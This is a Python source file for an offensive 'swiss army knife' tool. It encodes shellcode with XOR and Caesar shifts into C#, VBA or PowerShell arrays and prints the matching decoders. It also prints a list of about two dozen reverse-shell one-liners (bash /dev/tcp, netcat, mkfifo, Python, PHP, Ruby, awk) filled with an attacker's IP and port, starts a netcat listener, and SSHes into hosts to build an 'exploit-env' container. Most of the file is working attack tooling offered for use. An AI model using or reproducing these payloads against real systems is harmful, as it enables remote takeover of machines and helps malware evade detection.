#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Made by papi
# Created on: Sat 30 Mar 2024 01:18:15 PM CET
# swiss_parse.py
# Description:
#  a swiss amy knife python script.
# Options:
#  - cipher -> Take a binary file run's basic cipher on it like xor and generate the decoder
#  - revshell -> Generate reverse shells in useful formats.
#  - sshdocker -> Ssh on to a machine get's the os version and generates a Dockerfile.
# Cipher:
#   Formats:
#    - cs -> C# buffer array
#    - vba -> vba for office suite
#    - ps -> powershell
#   Usage:
#    - python swiss_parse.py cipher -x 136 -c 5 -f ./file.bin -l cs -o /opt/windows/cs_bytecode.txt 2> /opt/windows/decrypt_code.cs
#    -> this command will produce a vba byte array with a cesar cypher of 5 and a xor of 136.
#    -> the decryption code will then need to be: buf(i) = buf(i) - 2
#   TODO:
#    - Add support for C format & raw
# Revshell:
#   Arguments:
#    - -i, --ip -> Your ip address
#    - -p, --port -> Your listening port
#    - -b, --base64 -> Base64 encode the revershell
#   Usage:
#    - python swiss_parse.py revshell -i 127.0.0.1 -p 1234 -b 2> list.txt
#    -> This command will produce a list of all of the reverse shell with the correct
#    -> ip and port and save them to list.txt while also displaying the base64 version of them.
# Sshdocker:
#   Distribution:
#    - ubuntu
#    - debian
#    - opensuse-leap
#    - fedora
#    - alpine
#   Usage:
#    - python swiss_parse.py sshdocker -i 127.0.0.1 -u root -p toor 2> Dockerfile
#    -> This command will create a Dockerfile with the OS matching what is on the
#    -> ip address provided.

import getopt, sys, base64
import os, time

#==============================================================================
# This section is going to be gross but it will be for all the code snipets of
# the decoders
#==============================================================================
cs_snippet_decode_cesar='''byte[] buf = new byte[enc.Length];
for (int i = 0; i < enc.Length; i++) {
    buf[i] = (byte)(((uint)enc[i] - %d) & 0xFF);
}'''
cs_snippet_decode_xor='''for (int i = 0; i < enc.Length; i++) {
    enc[i] = enc[i] ^ %d;
}'''
vba_snipper_decode_cesar='''Dim counter As Long
Dim data As Long
For counter = LBound(buf) To UBound(buf)
    data = buf(counter) - %d
    Rem put here the code to move in memory or save to new array ^^
Next counter'''
ps_snipper_decode_cesar='''for($index = 0; $index -lt $buf.count; $index++) {
    $buf[$index] = $buf[$index] - %d
}'''
#==============================================================================
# Another great section where a list of all of the reverse shell is present so
# cool :)
#==============================================================================
revshells = [
    "sh -i >& /dev/tcp/%s/%d 0>&1", "0<&196;exec 196<>/dev/tcp/%s/%d; sh <&196 >&196 2>&196",
    "bash -i >& /dev/tcp/%s/%d 0>&1", "0<&196;exec 196<>/dev/tcp/%s/%d; bash <&196 >&196 2>&196",
    "exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do $line 2>&5 >&5; done",
    "sh -i 5<> /dev/tcp/%s/%d 0<&5 1>&5 2>&5", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %d >/tmp/f",
    "bash -i 5<> /dev/tcp/%s/%d 0<&5 1>&5 2>&5", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc %s %d >/tmp/f",
    "xterm -display %s:%d",
    "busybox nc %s %d -e sh", "nc -c sh %s %d", "nc %s %d -e sh",
    "C=\'curl -Ns telnet://%s:%d\'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null",
    "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect %s:%d > /tmp/s; rm /tmp/s",
    "php -r \'$sock=fsockopen(\"%s\",%d);exec(\"sh <&3 >&3 2>&3\");\'",
    "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\'",
    "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\'",
    "python3 -c \'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%d));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")\'",
    "ruby -rsocket -e\'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))\'",
    "ruby -rsocket -e\'exit if fork;c=TCPSocket.new(\"%s\",\"%d\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}\'",
    "sqlite3 /dev/null \'.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %d >/tmp/f\'",
    "zsh -c \'zmodload zsh/net/tcp && ztcp %s %d && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\'",
    "awk \'BEGIN {s = \"/inet/tcp/0/%s/%d\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null"
]
#==============================================================================
# Wow so cool more snippets basically these are the snippets for the docker
# containre generator
#==============================================================================
DISTRO_MAP = {
    "ubuntu": {
        "image": lambda v: f"ubuntu:{v}",
        "packages": "apt update && apt install -y build-essential git python3 util-linux xfsprogs e2fsprogs squashfs-tools"
    },
    "debian": {
        "image": lambda v: f"debian:{v}",
        "packages": "apt update && apt install -y build-essential git python3 util-linux xfsprogs e2fsprogs squashfs-tools"
    },
    "opensuse-leap": {
        "image": lambda v: f"opensuse/leap:{v}",
        "packages": "zypper refresh && zypper install -y gcc make git python3 glibc-devel util-linux xfsprogs e2fsprogs"
    },
    "fedora": {
        "image": lambda v: f"fedora:{v}",
        "packages": "dnf install -y gcc make git python3 glibc-devel util-linux xfsprogs e2fsprogs squashfs-tools"
    },
    "alpine": {
        "image": lambda v: f"alpine:{v}",
        "packages": "apk add --no-cache build-base gcc make musl-dev make git python3 util-linux xfsprogs e2fsprogs squashfs-tools"
    }
}
#==============================================================================

def usage():
    print(f"{sys.argv[0]}: Python swiss army knife for various tasks")
    print("\x1b[1;35m               _._\x1b[0m")
    print("\x1b[1;35m           __.{,_.).__\x1b[0m")
    print("\x1b[1;35m        .-"           "-.\x1b[0m")
    print("\x1b[1;35m      .'  __.........__  '.\x1b[0m")
    print("\x1b[1;35m     /.-'`___.......___`'-.\\\x1b[0m")
    print("\x1b[1;35m    /_.-'` /   \\ /   \\ `'-._\\\x1b[0m")
    print("\x1b[1;35m    |     |   '/ \\'   |     |\x1b[0m")
    print("\x1b[1;35m    |      '-'     '-'      |\x1b[0m")
    print("\x1b[1;35m    ;                       ;\x1b[0m")
    print("\x1b[1;35m    _\\         ___         /_\x1b[0m")
    print("\x1b[1;35m   /  '.'-.__  ___  __.-'.'  \\\x1b[0m")
    print("\x1b[1;35m _/_    `'-..._____...-'`    _\\_\x1b[0m")
    print("\x1b[1;35m/   \\           .           /   \\\x1b[0m")
    print("\x1b[1;35m\\____)         .           (____/\x1b[0m")
    print("\x1b[1;35m    \\___________.___________/\x1b[0m")
    print("\x1b[1;35m      \\___________________/\x1b[0m")
    print("\x1b[1;35mjgs  (_____________________)\x1b[0m")
    print()
    print("\x1b[1;32mcipher:\x1b[0m")
    print("A tool to take a .bin file and display it in")
    print("different formats with reversible encryption techniques.")
    print("Usage:")
    print("\t-h --help\tThis current output.")
    print("\t-e --enc\tPowershell base64 encryptor")
    print("\t-l --lang=\tLanguage format for the output (cs, ps, vba).")
    print("\t-f --file=\tThe file to read from.")
    print("\t-o --output=\tThe output file to write the byte code too. Can be (-) for stdout.")
    print("\t-c --cesar=\tThe increment for the cesar cypher (Default: 0).")
    print("\t-x --xor=\tThe increment for the xor cypher.")
    print("Example:")
    print(f"\t$ python {sys.argv[0]} cipher -o - -l cs -f ~/payload/demon.x64.bin -c 2")
    print("\t\x1b[1;31m[!] Saving the encoded data to the specified file\x1b[0m")
    print("\tbyte[] buf = new byte[] {")
    print("\t    0xfe, 0x4a, 0x54, ...")
    print("\t}")
    print("\t\x1b[1;31m[!] The payload decoder sample:\x1b[0m")
    print("\tfor (int i = 0; i < buf.Length; i++) {")
    print("\t    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF")
    print("\t}")
    print()
    print("\x1b[1;32mrevshell:\x1b[0m")
    print("A tool that will give you multiple reverse shells in useful formats")
    print("Usage:")
    print("\t-i --ip\t\tThe ip address of the attacker")
    print("\t-p --port\tThe port of the attacker")
    print("\t-b --base64\tEncode it all in base64")
    print("Example:")
    print(f"\t$ python {sys.argv[0]} revshell -i 127.0.0.1 -p 1234 -b")
    print("\t\x1b[1;31m[!] The revshells:\x1b[0m")
    print("\tsh -i >& /dev/tcp/127.0.0.1/1234 0>&1")
    print("\tb'c2ggLWkgPiYgL2Rldi90Y3AvJXMvJWQgMD4mMQ=='")
    print("\t...")
    print("\t\x1b[1;31m[!] Decode the base64:\x1b[0m")
    print("\techo <b64> | base64 -d | bash")
    print("\t\x1b[1;31m[!] Started ncat listener on 1234:\x1b[0m")
    print("\tListening on 0.0.0.0 1234")
    print()
    print("\x1b[1;32msshdocker:\x1b[0m")
    print("A tool that will ssh on a machine get it's os version and create a dockerfile with the matching OS")
    print("Usage:")
    print("\t-i --ip\t\tThe host to ssh on")
    print("\t-n --port\tThe port of the attacker")
    print("\t-u --username\tThe username to use")
    print("\t-k --key\tThe ssh keyfile")
    print("\t-p --password\tThe password to the username/The password to the keyfile")
    print("\t-a --alive\tKeep the ssh connection alive.")
    print("\t-g --generate\tGenerate a Dockerfile from the provided distro name to the latest version.")
    print("Available Distros:")
    print("\tubuntu,debian,opensuse-leap,fedora,alpine")
    print("Example:")
    print(f"\t$ python {sys.argv[0]} sshdocker -i 127.0.0.1 -u root -p toor")
    print("\t\x1b[1;31m[!] Starting the ssh connection:\x1b[0m")
    print("\tcat /etc/os-release")
    print("\tNAME=\"openSUSE Leap\"")
    print("\tVERSION_ID=\"15.6\"")
    print("\tID=\"opensuse-leap\"")
    print("\t...")
    print("\t\x1b[1;31m[!] Generating the Dockerfile\x1b[0m")
    print("\tFROM opensuse/leap:15.6")
    print("\tRUN zypper refresh && zypper install -y gcc make git python3 glibc-devel util-linux xfsprogs e2fsprogs squashfs-tools")
    print("\tWORKDIR /work")
    print("\tCMD [\"/bin/bash\"]")


def display_byte(byte, pos, language):
    '''
    [int] -> byte
    [int] -> pos
    Return -> [char]
    '''
    char = ''
    if language == 'vba':
        pos += 1
        char = "%d, " % (byte)
        if pos % 20 == 0:
            char += "_\n"
    elif language == 'cs' or language == 'ps':
        char = "0x%x, " % (byte)
        if pos % 20 == 0 and language != 'ps':
            char += "\n\t"
    return char

def run_encoding(byte, cesar, xor):
    val = (int.from_bytes(byte, byteorder='big') + cesar)
    if xor != -1:
        val = val ^ xor
    return val

def encoder(language, file, cesar, xor):
    counter = 0
    encrypted_value = ""
    with open(file, "rb") as fp:
        byte = fp.read(1)
        while byte:
            counter += 1
            encrypted_value += display_byte(run_encoding(byte, cesar, xor), counter, language)
            byte = fp.read(1)
    if language == 'cs':
        return "int[] enc = new int[] {\n\t%s\n};" % encrypted_value[:-2]
    elif language == 'ps':
        return "[Byte[]] $buf = %s" % encrypted_value[:-2]
    elif language == 'vba':
        return "buf = Array(%s)" % encrypted_value[:-2]

def handle_encoded(encoded_data, out_file):
    if out_file == '-':
        print(encoded_data, file=sys.stderr)
    else:
        with open(out_file, "w") as fp:
            fp.write(encoded_data)

def show_decoder(cesar, language, xor):
    if language == 'cs' and cesar > 0:
        if xor != -1:
            print(cs_snippet_decode_xor % xor, file=sys.stderr)
        print(cs_snippet_decode_cesar % cesar, file=sys.stderr)
    if language == 'vba' and cesar > 0:
        print(vba_snipper_decode_cesar % cesar, file=sys.stderr)
    if language == 'ps' and cesar > 0:
        print(ps_snipper_decode_cesar % cesar, file=sys.stderr)

def cipher():
    try:
        opts, args = getopt.getopt(sys.argv[2:], "hl:f:c:o:x:e:", ["help", "lang=", "file=", "cesar=", "output=", "xor=", "enc="])
    except getopt.GetoptError as err:
        print(err)
        usage()
        sys.exit(-1)
    language = None
    file = None
    out_file = ""
    cesar = 0
    xor = -1
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-l", "--lang"):
            language = a
        elif o in ("-f", "--file"):
            file = a
        elif o in ("-c", "--cesar"):
            cesar = int(a)
        elif o in ("-x", "--xor"):
            xor = int(a)
        elif o in ("-o", "--output"):
            out_file = a
        elif o in ("-e", "--enc"):
            print("\x1b[1;31m[!] Powershell b64 data:\x1b[0m")
            print(base64.b64encode(a.encode('utf16')[2:]).decode())
            sys.exit(0)
        else:
            usage()
            sys.exit(-1)
    if language in ("vba", "cs", "ps") and os.path.exists(file):
        encoded_data = encoder(language, file, cesar, xor)
        print("\x1b[1;31m[!] Saving the encoded data to the specified file\x1b[0m")
        handle_encoded(encoded_data, out_file)
        print("\x1b[1;31m[!] The payload decoder sample:\x1b[0m")
        show_decoder(cesar, language, xor)
    else:
          print("not the correct output format or file")
          sys.exit(-1)

def display_shell(ip, port, b64):
    print("\x1b[1;31m[!] The revshells:\x1b[0m")
    for shell in revshells:
        print(shell % (ip, port), file=sys.stderr)
        if b64:
            print(base64.b64encode(shell.encode('UTF-8')))
    if b64:
        print("\x1b[1;31m[!] Decode the base64:\x1b[0m")
        print("echo <b64> | base64 -d | bash")
    result = input("\x1b[1;32m[?] netcat (Y/n):\x1b[0m ")
    if result in ("", "y", "yes", "Y", "YES", "Yes"):
        print("\x1b[1;31m[!] Started ncat listener on %d\x1b[0m" % port)
        os.system("nc -lvp %d" % port)
    else:
        print("\x1b[1;34m[*] Don't forget to add the victim to xhost with\x1b[0m: xhost +target.ip")
        print("\x1b[1;31m[!] Started xnest listener on %d\x1b[0m" % port)
        os.system("Xnest :%d" % port)

def revshell():
    try:
        opts, args = getopt.getopt(sys.argv[2:], "hi:p:b", ["help", "base64", "ip=", "port="])
    except getopt.GetoptError as err:
        print(err)
        usage()
        sys.exit(-1)
    b64 = False
    ip = None
    port = None
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-i", "--ip"):
            ip = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("-b", "--base64"):
            b64 = True
        else:
            usage()
            sys.exit(-1)
    display_shell(ip, port, b64)

def parse_env(text: str) -> dict: #thx chatgpt
    data = {}
    for line in text.splitlines():
        line = line.strip()
        # Skip empty lines
        if not line:
            continue
        # Skip malformed lines
        if "=" not in line:
            continue
        key, value = line.split("=", 1)
        # Remove quotes if present
        value = value.strip().strip('"')
        data[key] = value
    return data


def ssh_session(ip, port, username, password, ssh_key_file):
    try:
        import paramiko
    except ImportError:
        print("\x1b[1;31m[!] This feature needs paramiko please install it.\x1b[0m")
        sys.exit(-1)
    meta_data = {
        "os-release": None
    }
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if ssh_key_file:
        ssh.connect(hostname=ip, port=port, username=username, key_filename=ssh_key_file,
                    password=password)
    else:
        ssh.connect(hostname=ip, port=port, username=username, password=password)
    print("$ cat /etc/os-release")
    stdin, stdout, stderr = ssh.exec_command("cat /etc/os-release")
    output = stdout.read().decode()
    error = stderr.read().decode()
    if len(error) != 0:
        print("\x1b[1;31m[!] Failed to execute command:\x1b[0m")
        print(error)
        ssh.close()
        return None, None
    print(output)
    res = parse_env(output)
    meta_data["os-release"] = res
    return ssh, meta_data

def parse_to_docker(meta_data, generate_docker=None):
    if generate_docker:
        print("FROM %s" % DISTRO_MAP[generate_docker]["image"]("latest"), file=sys.stderr)
        print("RUN %s" % DISTRO_MAP[generate_docker]["packages"], file=sys.stderr)
        print("WORKDIR /work", file=sys.stderr)
        print("CMD [\"/bin/bash\"]", file=sys.stderr)
    else:
        print("FROM %s" % DISTRO_MAP[meta_data["os-release"]["ID"]]["image"](meta_data["os-release"]["VERSION_ID"]), file=sys.stderr)
        print("RUN %s" % DISTRO_MAP[meta_data["os-release"]["ID"]]["packages"], file=sys.stderr)
        print("WORKDIR /work", file=sys.stderr)
        print("CMD [\"/bin/bash\"]", file=sys.stderr)

def stay_alive(ssh):
    chan = ssh.invoke_shell()
    print("\x1b[1;31m[!] Staying alive!!!!!\x1b[0m")
    print("Type 'exit' to quit.")
    chan.send("stty -echo\n") # this will remove the command echo
    time.sleep(0.3)
    while True:
        output = chan.recv(9999).decode(errors="ignore")
        print(output, end="")
        cmd = input('')
        if cmd.strip() in ("exit", "quit"):
            break
        chan.send(cmd + "\n")
        time.sleep(0.3)
    chan.close()

def sshdocker():
    try:
        opts, args = getopt.getopt(sys.argv[2:], "hag:i:n:u:p:k:", ["help", "alive", "generate", "ip", "port", "username", "password", "key"])
    except getopt.GetoptError as err:
        print(err)
        usage()
        sys.exit(-1)
    keep_alive = False
    ip = None
    port = 22
    username = None
    password = None
    ssh_key_file = None
    generate_docker = None
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-i", "--ip"):
           ip = a
        elif o in ("-n", "--port"):
           ip = int(a)
        elif o in ("-u", "--username"):
           username = a
        elif o in ("-p", "--password"):
            password = a
        elif o in ("-g", "--generate"):
            generate_docker = a
        elif o in ("-k", "--key"):
            ssh_key_file = a
        elif o in ("-a", "--alive"):
           keep_alive = True
        else:
            usage()
            sys.exit(-1)
    if (ip and username and (password or ssh_key_file)):
        print("\x1b[1;31m[!] Starting the ssh connection\x1b[0m")
        ssh, meta_data = ssh_session(ip, port, username, password, ssh_key_file)
        if meta_data:
            print("\x1b[1;31m[!] Generating the Dockerfile\x1b[0m")
            parse_to_docker(meta_data)
            print("\x1b[1;32m[*] If build of the image does not exist\x1b[0m")
            print("Change %s to latest" % meta_data["os-release"]["VERSION_ID"])
            print("\x1b[1;31m[!] Execute with the following:\x1b[0m")
            print("sudo docker build -t exploit-env .")
            print("sudo docker run --rm --privileged -v \"$PWD\":/work -it exploit-env")
            if ssh and keep_alive:
                stay_alive(ssh)
                ssh.close()
    elif generate_docker:
        print("\x1b[1;31m[!] Generating the Dockerfile\x1b[0m")
        parse_to_docker(None, generate_docker)
    else:
        print("python %s -i <ip.addr> -u <username> -p <password> -k <keyfile>" % sys.argv[0])
        sys.exit(-1)

if __name__ == "__main__":
    if sys.argv[1] == "cipher":
        cipher()
    elif sys.argv[1] == "revshell":
        revshell()
    elif sys.argv[1] == "sshdocker":
        sshdocker()
    else:
        usage()
        sys.exit(-1)
